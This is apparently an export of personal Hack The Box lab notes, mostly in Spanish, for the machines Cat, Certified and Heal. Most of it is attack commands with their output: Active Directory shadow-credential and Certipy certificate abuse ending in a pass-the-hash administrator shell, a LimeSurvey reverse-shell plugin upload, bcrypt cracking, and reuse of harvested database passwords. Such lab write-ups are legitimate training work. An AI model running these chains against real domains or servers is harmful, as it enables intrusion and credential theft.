<img alt="Pasted image 20250211105340.png" src="machines/cat/imgs/pasted-image-20250211105340.png"><br><br>➜  Cat echo "PD9waHAKJHZhbGlkX3VzZXJuYW1lID0gJ2FkbWluJzsKJHZhbGlkX3Bhc3N3b3JkID0gJ0lLdzc1ZVIwTVI3Q01JeGhIMCc7CgppZiAoIWlzc2V0KCRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10pIHx8ICFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkgfHwgCiAgICAkX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddICE9ICR2YWxpZF91c2VybmFtZSB8fCAkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSAhPSAkdmFsaWRfcGFzc3dvcmQpIHsKICAgIAogICAgaGVhZGVyKCdXV1ctQXV0aGVudGljYXRlOiBCYXNpYyByZWFsbT0iRW1wbG95ZWUgTWFuYWdlbWVudCInKTsKICAgIGhlYWRlcignSFRUUC8xLjAgNDAxIFVuYXV0aG9yaXplZCcpOwogICAgZXhpdDsKfQoKaGVhZGVyKCdMb2NhdGlvbjogZGFzaGJvYXJkLnBocCcpOwpleGl0Owo%2FPgoK" | base64 -d
&lt;?php
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || 
    $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {
    
    header('WWW-Authenticate: Basic realm="Employee Management"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}

header('Location: dashboard.php');
exit;
base64: invalid input
➜  Cat 
<br>Bueno pues resulta que las creds de admin es la password de root:<br>
<img alt="Pasted image 20250211105458.png" src="machines/cat/imgs/pasted-image-20250211105458.png">]]></description><link>machines/cat/2-privesc.html</link><guid isPermaLink="false">Machines/Cat/2 -PrivEsc.md</guid><pubDate>Tue, 11 Feb 2025 09:55:00 GMT</pubDate><enclosure url="machines/cat/imgs/pasted-image-20250210154828.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/cat/imgs/pasted-image-20250210154828.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[00-index]]></title><description><![CDATA[ 
 <br>This is the structure of the machine folder<br><br><br><br><br><br><br><br><br><br>
<br>Text
<br>Text
<br><br>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a>
<br><a rel="noopener nofollow" class="external-link" href="https://sqlmap.org/" target="_blank">https://sqlmap.org/</a>
<br>...
]]></description><link>machines/certified/00-index.html</link><guid isPermaLink="false">Machines/Certified/00-index.md</guid><pubDate>Mon, 27 Jan 2025 22:45:08 GMT</pubDate></item><item><title><![CDATA[01-recon]]></title><description><![CDATA[ 
 <br>Bueno maquina windows<br><br><br><br>Usamos Netexex para sacar los datos para Bloodhound<br>nxc ldap dc01.certified.htb -u judith.mader -p judith09 --bloodhound --collection All --dns-tcp --dns-server 10.10.11.41

SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.41     389    DC01             [+] certified.htb\judith.mader:judith09 
LDAP        10.10.11.41     389    DC01             Resolved collection methods: localadmin, objectprops, acl, dcom, container, trusts, psremote, group, rdp, session
LDAP        10.10.11.41     389    DC01             Done in 00M 11S
LDAP        10.10.11.41     389    DC01             Compressing output into /home/cher0/.nxc/logs/DC01_10.10.11.41_2025-01-28_002747_bloodhound.zip

<br><br>
<br>Judith Mader's Permissions:
<br>Judith Mader has WriteOwner permissions on the Management group.
<br>Service Account (Management_SVC):
<br>The Management_SVC account has GenericWrite permissions over the Management group.
<br>CA_Operator Privilege:
<br>The Management_SVC account has GenericAll permissions over the CA_Operator user.
<br><br>Usamos BloodyAD<br>
<a rel="noopener nofollow" class="external-link" href="https://github.com/CravateRouge/bloodyAD.git" target="_blank">https://github.com/CravateRouge/bloodyAD.git</a><br>Se usa bloodyAd para hacer  a judith owner del Grupo Management!<br>bloodyAD --host "$IP" -d "certified.htb" -u "judith.mader" -p "judith09" set owner Management judith.mader
<br><br>Modificamos los permisos del grupo con dacledit<br>└─# python3 dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,N  Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250128-100158.bak
[*] DACL modified successfully!

<br>Metemos a judith en Management<br>python3 bloodyAD.py --host $IP -d 'certified.htb' -u 'judith.mader' -p 'judith09' add groupMember "Management" "judith.mader"
[+] judith.mader added to Management

<br><br>python3 pywhisker/pywhisker.py -d "certified.htb" -u "judith.mader" -p judith09 --target "management_svc" --action add 
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 3245a0ff-4c14-b1c4-dd73-e1caabc9d6f0
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate &amp; key at path: 2edmEK5f.pfx
[*] Must be used with password: FE2RL7C3C8FT44c3EV9H
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

<br>PKINITtools<br>
Usamos PKINIT para obtener el ticket (TGT)<br> python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx /home/cher0/HTB/Certified/pywhisker/2edmEK5f.pfx  -pfx-pass FE2RL7C3C8FT44c3EV9H pwn.ccache
2025-01-28 17:13:54,588 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-01-28 17:13:54,606 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-01-28 17:14:06,825 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-01-28 17:14:06,825 minikerberos INFO     fbd1f3ce1b49bf35543ab5c200f2fad1681cd7be4efd566bbc694b18181000cc
INFO:minikerberos:fbd1f3ce1b49bf35543ab5c200f2fad1681cd7be4efd566bbc694b18181000cc
2025-01-28 17:14:06,828 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
<br>Ahora usamos gethash para solicitar el NThash con el ccache<br>Para usar la herramienta debemos establecer la variable KRB5CCNAME al archivo ccache que nos proporciono gettgtpkinit:<br>export KRB5CCNAME=pwn.ccache    
➜  PKINITtools git:(master) python3 getnthash.py certified.htb/management_svc -key fbd1f3ce1b49bf35543ab5c200f2fad1681cd7be4efd566bbc694b18181000cc                                   
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584

<br>Una vez obtenido el hash podemos loguearnos con evil-winrm<br> evil-winrm -i $IP -H a091c1832bcdd4677c28b5a6a1295584 -u management_svc
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                     
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents&gt; 

<br>]]></description><link>machines/certified/01-recon.html</link><guid isPermaLink="false">Machines/Certified/01-recon.md</guid><pubDate>Tue, 28 Jan 2025 16:39:02 GMT</pubDate></item><item><title><![CDATA[02-exploitation]]></title><description><![CDATA[ 
 <br><br>
<br>
<br>
<br><br><br><br>
<br>
<br><br>
<br>
<br>]]></description><link>machines/certified/02-exploitation.html</link><guid isPermaLink="false">Machines/Certified/02-exploitation.md</guid><pubDate>Mon, 27 Jan 2025 22:44:59 GMT</pubDate></item><item><title><![CDATA[03-post-exploitation]]></title><description><![CDATA[ 
 <br><br>Discovered that management_svc had GenericAll rights over ca_operator.<br>Usamos certipy-ad para modificar ca_operator KeyCredential:<br>
<a rel="noopener nofollow" class="external-link" href="https://github.com/ly4k/Certipy.git" target="_blank">https://github.com/ly4k/Certipy.git</a><br>certipy shadow auto -u management_svc@certified.htb -hashes $NThash -account ca_operator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'c65a33ce-ffe3-98a5-446a-e044e651386b'
[*] Adding Key Credential with device ID 'c65a33ce-ffe3-98a5-446a-e044e651386b' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID 'c65a33ce-ffe3-98a5-446a-e044e651386b' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2

<br><br>Updated the UPN (UserPrincipalName) of ca_operator to administrator:<br>ertipy account update -u management_svc@certified.htb -hashes $NThash -user ca_operator  -upn administrator 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'
<br><br>certipy req -username ca_operator@certified.htb -hashes $NThash -ca certified-DC01-CA -template CertifiedAuthentication
Certipy v4.8.2 - by Oliver Lyak (ly4k)

/home/cher0/.local/lib/python3.12/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.20) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with UPN 'ca_operator@certified.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'ca_operator.pfx'

<br><br>Restored ca_operator’s UPN to its original value:<br>certipy account update -u management_svc@certified.htb -hashes $NThash -user ca_operator  -upn ca_operator@certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
<br><br>Con el certificado previamente obtenido .pfx conseguimos el hash de administrator<br>certipy auth -pfx administrator.pfx -domain certified.htb 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34

<br>evil-winrm -i $IP -H 0d5b49608bbce1751f708748f67e2d34 -u administrator 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                     
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; 

<br>]]></description><link>machines/certified/03-post-exploitation.html</link><guid isPermaLink="false">Machines/Certified/03-post-exploitation.md</guid><pubDate>Tue, 28 Jan 2025 17:18:13 GMT</pubDate></item><item><title><![CDATA[Certified]]></title><description><![CDATA[<a class="tag" href="?query=tag:machine" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#machine</a> 
 <br><br><br> <img src="https://www.hackthebox.com//storage/avatars/28b71ec11bb839b5b58bdfc555006816.png" referrerpolicy="no-referrer"> <br><a href=".?query=tag:machine" class="tag" target="_blank" rel="noopener nofollow">#machine</a><br><br><img src="lib/media/windows.png" style="max-width:70px" referrerpolicy="no-referrer"><br><br><br>
id:: 633
active:: True
name:: Certified
os::Windows
user_flag:: False
root_flag:: False
difficulty_text:: Medium
stars:: 4.8
created:: 01/27/2025
published:: 11/02/24
avatar:: /storage/avatars/28b71ec11bb839b5b58bdfc555006816.png
tags:: 
<br><br><br><br><br>Update this Machine info]]></description><link>machines/certified/certified.html</link><guid isPermaLink="false">Machines/Certified/Certified.md</guid><pubDate>Mon, 27 Jan 2025 22:44:59 GMT</pubDate><enclosure url="https://www.hackthebox.com//storage/avatars/28b71ec11bb839b5b58bdfc555006816.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.hackthebox.com//storage/avatars/28b71ec11bb839b5b58bdfc555006816.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[00-index]]></title><description><![CDATA[ 
 <br>This is the structure of the machine folder<br><br><br><br><br><br><br><br><br><br>
<br>Text
<br>Text
<br><br>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a>
<br><a rel="noopener nofollow" class="external-link" href="https://sqlmap.org/" target="_blank">https://sqlmap.org/</a>
<br>...
]]></description><link>machines/heal/00-index.html</link><guid isPermaLink="false">Machines/Heal/00-index.md</guid><pubDate>Sat, 25 Jan 2025 18:07:27 GMT</pubDate></item><item><title><![CDATA[01-recon]]></title><description><![CDATA[ 
 <br><br><br><br><br>Ports tcp open in nmap format<br><br>Ports services and versions nmap format<br><br>Ports UDP nmap format<br><br><br><br><br><img alt="Pasted image 20250125191214.png" src="machines/heal/imgs/pasted-image-20250125191214.png"><br>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
avahi:x:114:120:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
geoclue:x:115:121::/var/lib/geoclue:/usr/sbin/nologin
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
ron:x:1001:1001:,,,:/home/ron:/bin/bash
<br>Database.yml:<br><img alt="Pasted image 20250125192941.png" src="machines/heal/imgs/pasted-image-20250125192941.png"><br>Cogemos los archivos "test" y "development";<br><img alt="Pasted image 20250125200410.png" src="machines/heal/imgs/pasted-image-20250125200410.png"><br>encontramos el  hash de ralph , lo pasamos a john:<br>1|ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG|2024-09-27 07:49:31.614858|2024-09-27 07:49:31.614858|Administrator|ralph|1
2|cher0@mail.com|$2a$12$V5gIpHzGI1aIbV4WD81bxO4VZzIHNgkCSnnqPmREgKjDq2zN6i4De|2025-01-25 18:24:48.597549|2025-01-25 18:24:48.597549|cher0 del rio |cher0|0

<br>Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 8 OpenMP threads
Proceeding with wordlist:/usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 6.71% (ETA: 20:10:11) 0g/s 47.05p/s 47.05c/s 47.05C/s asdfgh..zephyr
147258369        (?)     
1g 0:00:00:47 DONE (2025-01-25 20:10) 0.02107g/s 47.04p/s 47.04c/s 47.04C/s 333333..iverson
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

<br>Tenemos la password de ralph<br>
ralph:147258369<br>No funciona en ssh pero podemos acceder desde la url<br>
<a rel="noopener nofollow" class="external-link" href="http://take-survey.heal.htb/index.php/admin/authentication/sa/login" target="_blank">http://take-survey.heal.htb/index.php/admin/authentication/sa/login</a><br><img alt="Pasted image 20250125201341.png" src="machines/heal/imgs/pasted-image-20250125201341.png"><br>Podemos entrar!<br>
<img alt="Pasted image 20250125201412.png" src="machines/heal/imgs/pasted-image-20250125201412.png"><br>]]></description><link>machines/heal/01-recon.html</link><guid isPermaLink="false">Machines/Heal/01-recon.md</guid><pubDate>Sat, 25 Jan 2025 19:14:13 GMT</pubDate><enclosure url="machines/heal/imgs/pasted-image-20250125191214.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/heal/imgs/pasted-image-20250125191214.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[02-exploitation]]></title><description><![CDATA[ 
 <br><br>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git" target="_blank">https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git</a>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/Y1LD1R1M-1337/Limesurvey-RCE" target="_blank">https://github.com/Y1LD1R1M-1337/Limesurvey-RCE</a>
<br><br><br>Comprobamos la version del Limesurvey<br>
<img alt="Pasted image 20250125201606.png" src="machines/heal/imgs/pasted-image-20250125201606.png"><br>Vemos que Limesurver corre bajo la version 6.6.4<br>
Hay un RCE compatible en git :<br>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git" target="_blank">https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git</a>
<br>LimeSurvey Authenticated RCE Proof of Concept:<br>
<br>Create your files (config.xml and php reverse shell files)
<br>Create archive with these files
<br>Login with credentials
<br>Go Configuration -&gt; Plugins -&gt; Upload &amp; Install
<br>Choose your zipped file
<br>Upload
<br>Install
<br>Activate plugin
<br>Start your listener
<br>Go url+{upload/plugins/#Name/#Shell_file_name}
<br>Get reverse shell<br>
<img title=":shipit:" alt=":shipit:" src="https://github.githubassets.com/images/icons/emoji/shipit.png" referrerpolicy="no-referrer">
<br>Modificamos la Rev SHELL<br>
<img alt="Pasted image 20250125201930.png" src="machines/heal/imgs/pasted-image-20250125201930.png"><br>vamos a subir la rev-shell<br>
<img alt="Pasted image 20250125202206.png" src="machines/heal/imgs/pasted-image-20250125202206.png"><br>
Zippeamos la Rev-shell y la subimos:<br>  exploit git:(main) ✗ zip EXPLOIT.zip config.xml php-rev.php 
  adding: config.xml (deflated 56%)
  adding: php-rev.php (deflated 61%)

<br><img alt="Pasted image 20250125202623.png" src="machines/heal/imgs/pasted-image-20250125202623.png"><br>
<img alt="Pasted image 20250125202648.png" src="machines/heal/imgs/pasted-image-20250125202648.png"><br>
Lo activamos:<br>
<img alt="Pasted image 20250125202755.png" src="machines/heal/imgs/pasted-image-20250125202755.png"><br>Ahora para triggerear la rev shell debemos ir a<br>
url+{upload/plugins/#Name/#Shell_file_name}<br>En nuestro caso:<br>
<a rel="noopener nofollow" class="external-link" href="http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php" target="_blank">http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php</a><br><br><br><br>cat config.php
&lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');
/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|    'connectionString' Hostname, database, port and database type for 
|     the connection. Driver example: mysql. Currently supported:
|                 mysql, pgsql, mssql, sqlite, oci
|    'username' The username used to connect to the database
|    'password' The password used to connect to the database
|    'tablePrefix' You can add an optional prefix, which will be added
|                 to the table name when using the Active Record class
|
*/
return array(
        'components' =&gt; array(
                'db' =&gt; array(
                        'connectionString' =&gt; 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
                        'emulatePrepare' =&gt; true,
                        'username' =&gt; 'db_user',
                        'password' =&gt; 'AdmiDi0_pA$$w0rd',
                        'charset' =&gt; 'utf8',
                        'tablePrefix' =&gt; 'lime_',
                ),

                 'session' =&gt; array (
                        'sessionName'=&gt;'LS-ZNIDJBOXUNKXWTIP',
                        // Uncomment the following lines if you need table-based sessions.
                        // Note: Table-based sessions are currently not supported on MSSQL server.
                        // 'class' =&gt; 'application.core.web.DbHttpSession',
                        // 'connectionID' =&gt; 'db',
                        // 'sessionTableName' =&gt; '{{sessions}}',
                 ),

                'urlManager' =&gt; array(
                        'urlFormat' =&gt; 'path',
                        'rules' =&gt; array(
                                // You can add your own rules here
                        ),
                        'showScriptName' =&gt; true,
                ),

                // If URLs generated while running on CLI are wrong, you need to set the baseUrl in the request component. For example:
                //'request' =&gt; array(
                //      'baseUrl' =&gt; '/limesurvey',
                //),
        ),
        // For security issue : it's better to set runtimePath out of web access
        // Directory must be readable and writable by the webuser
        // 'runtimePath'=&gt;'/var/limesurvey/runtime/'
        // Use the following config variable to set modified optional settings copied from config-defaults.php
        'config'=&gt;array(
        // debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
        // then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
        // on your webspace.
        // LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
                'debug'=&gt;0,
                'debugsql'=&gt;0, // Set this to 1 to enanble sql logging, only active when debug = 2

                // If URLs generated while running on CLI are wrong, you need to uncomment the following line and set your
                // public URL (the URL facing survey participants). You will also need to set the request-&gt;baseUrl in the section above.
                //'publicurl' =&gt; 'https://www.example.org/limesurvey',

                // Update default LimeSurvey config here
        )
);
/* End of file config.php */
/* Location: ./application/config/config.php */
$ pwd
/var/www/limesurvey/application/config
$ cat config.php
&lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');
/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|    'connectionString' Hostname, database, port and database type for 
|     the connection. Driver example: mysql. Currently supported:
|                 mysql, pgsql, mssql, sqlite, oci
|    'username' The username used to connect to the database
|    'password' The password used to connect to the database
|    'tablePrefix' You can add an optional prefix, which will be added
|                 to the table name when using the Active Record class
|
*/
return array(
        'components' =&gt; array(
                'db' =&gt; array(
                        'connectionString' =&gt; 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
                        'emulatePrepare' =&gt; true,
                        'username' =&gt; 'db_user',
                        'password' =&gt; 'AdmiDi0_pA$$w0rd',
                        'charset' =&gt; 'utf8',
                        'tablePrefix' =&gt; 'lime_',
                ),

                 'session' =&gt; array (
                        'sessionName'=&gt;'LS-ZNIDJBOXUNKXWTIP',
                        // Uncomment the following lines if you need table-based sessions.
                        // Note: Table-based sessions are currently not supported on MSSQL server.
                        // 'class' =&gt; 'application.core.web.DbHttpSession',
                        // 'connectionID' =&gt; 'db',
                        // 'sessionTableName' =&gt; '{{sessions}}',
                 ),

                'urlManager' =&gt; array(
                        'urlFormat' =&gt; 'path',
                        'rules' =&gt; array(
                                // You can add your own rules here
                        ),
                        'showScriptName' =&gt; true,
                ),

                // If URLs generated while running on CLI are wrong, you need to set the baseUrl in the request component. For example:
                //'request' =&gt; array(
                //      'baseUrl' =&gt; '/limesurvey',
                //),
        ),
        // For security issue : it's better to set runtimePath out of web access
        // Directory must be readable and writable by the webuser
        // 'runtimePath'=&gt;'/var/limesurvey/runtime/'
        // Use the following config variable to set modified optional settings copied from config-defaults.php
        'config'=&gt;array(
        // debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
        // then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
        // on your webspace.
        // LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
                'debug'=&gt;0,
                'debugsql'=&gt;0, // Set this to 1 to enanble sql logging, only active when debug = 2

                // If URLs generated while running on CLI are wrong, you need to uncomment the following line and set your
                // public URL (the URL facing survey participants). You will also need to set the request-&gt;baseUrl in the section above.
                //'publicurl' =&gt; 'https://www.example.org/limesurvey',

                // Update default LimeSurvey config here
        )
);
/* End of file config.php */
/* Location: ./application/config/config.php */
<br>Probamos las credeciales con el usuario ronq ue encontramos en el /etc/password :<br>    'username' =&gt; 'db_user',
                        'password' =&gt; 'AdmiDi0_pA$$w0rd',
<br>Credenciales de Ron:<br>
ron:AdmiDi0_pA$$w0rd]]></description><link>machines/heal/02-exploitation.html</link><guid isPermaLink="false">Machines/Heal/02-exploitation.md</guid><pubDate>Sat, 25 Jan 2025 19:41:55 GMT</pubDate><enclosure url="machines/heal/imgs/pasted-image-20250125201606.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/heal/imgs/pasted-image-20250125201606.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[03-post-exploitation]]></title><description><![CDATA[ 
 <br><br>
<br>Port 8500
<br><br>Encontramos una pagina web en la 127.0.0.1:8500 de la maquina por lo que hacemos port-fowarding por ssh<br>ssh ron@heal.htb -L 8500:localhost:8500
<br>encontramos esta web :<br>
<img alt="Pasted image 20250126124947.png" src="machines/heal/imgs/pasted-image-20250126124947.png"><br>Mirando el source code encuentro la version de la API<br>
<img alt="Pasted image 20250126125105.png" src="machines/heal/imgs/pasted-image-20250126125105.png"><br>Estamos frente a un Consul 1.19.2<br><a rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/51117" target="_blank">https://www.exploit-db.com/exploits/51117</a><br>]]></description><link>machines/heal/03-post-exploitation.html</link><guid isPermaLink="false">Machines/Heal/03-post-exploitation.md</guid><pubDate>Sun, 26 Jan 2025 13:42:50 GMT</pubDate><enclosure url="machines/heal/imgs/pasted-image-20250126124947.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/heal/imgs/pasted-image-20250126124947.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Heal]]></title><description><![CDATA[<a class="tag" href="?query=tag:machine" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#machine</a> 
 <br><br><br> <img src="https://www.hackthebox.com//storage/avatars/dcd5ef09ab764228c64385374ac744c1.png" referrerpolicy="no-referrer"> <br><a href=".?query=tag:machine" class="tag" target="_blank" rel="noopener nofollow">#machine</a><br><br><img src="lib/media/linux.png" style="max-width:70px" referrerpolicy="no-referrer"><br><br><br>
id:: 640
active:: True
name:: Heal
os::Linux
user_flag:: False
root_flag:: False
difficulty_text:: Medium
stars:: 4.5
created:: 01/25/2025
published:: 12/14/24
avatar:: /storage/avatars/dcd5ef09ab764228c64385374ac744c1.png
tags:: 
